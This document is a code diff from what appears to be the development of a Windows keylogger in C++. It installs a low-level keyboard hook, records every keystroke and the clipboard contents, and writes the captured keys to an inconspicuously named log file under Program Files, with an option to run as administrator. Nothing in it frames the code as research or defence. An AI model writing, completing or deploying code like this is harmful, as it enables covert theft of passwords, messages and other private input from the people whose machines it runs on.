@@ -8,6 +8,7 @@
 //std::vector<std::string> savedChars = {}; //have to use string for TAB and stuff like that.
 std::vector<int> savedChars = {};
 std::vector<std::string> savedSentences = { "" }; //init emtpy string fist off
+std::vector<std::string> clipboardVector = {};
 std::string storedClipboardContents = "";
 
 //main entry point
@@ -16,8 +17,11 @@ HHOOK* handle_to_hook = new HHOOK;
 
 bool is_shift_on = false; //GLOBAL
 bool is_control_on = false; //global
+int error_count = 0;
 
 #define USE_LITERALS false;
+
+#define USE_ADMIN true; //false if you want to run as non-admin, but not advised.
 
 LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 {
@@ -36,19 +40,35 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 
 	if (vk != VK_LSHIFT && vk != VK_RSHIFT && vk != VK_LCONTROL && vk != VK_RCONTROL && wparam == WM_KEYDOWN)
 	{
+
 		//if statements all went through. we can now run our funcs.
 
 		//don't know if we're actually going to handle control or not...
 		//if (is_control_on)
 		//	curCharStr += "c";
 
-		//std::string curCharStr = std::to_string(handleCharsFinal(vk, is_shift_on));
-		//savedChars.push_back(curCharStr);
+		int curCharInt = handleCharsFinal(vk, is_shift_on);
+		savedChars.push_back(curCharInt);
+		
+#ifndef USE_ADMIN
+		char username[UNLEN+1];
+		DWORD username_length = UNLEN + 1;
+		if (GetUserNameA(username, &username_length))
+		{
+
+		}
+#else
+
+		flushChars(savedChars, "C:\\Program Files\\zlog1.txt", error_count, true, 100);
+		std::cout << savedChars.size() << '\n';
+
+#endif
 	}
 	
 	if (grabClipboard(storedClipboardContents))
 	{
-		std::cout << "CLIPBOARD: " << storedClipboardContents << '\n';
+		//clipboard handling here
+		clipboardVector.push_back(storedClipboardContents);
 	}
 
 #endif
@@ -66,7 +86,7 @@ __forceinline void startHook()
 	}
 }
 
-#define test true;
+#define test false;
 
 int main()
 {
